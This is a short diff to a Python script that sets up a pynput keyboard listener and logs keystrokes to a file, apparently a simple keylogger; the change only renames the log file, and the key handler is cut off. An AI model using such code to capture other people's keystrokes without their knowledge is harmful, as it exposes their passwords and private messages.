@@ -1,7 +1,7 @@
 from pynput.keyboard import Listener
 import logging
 
-file = "touch.txt"
+file = "BAKA-HENTAI.txt"
 logging.basicConfig(filename=file, level=logging.DEBUG, format="%(asctime)s %(message)s")
 
 def on_press(key):
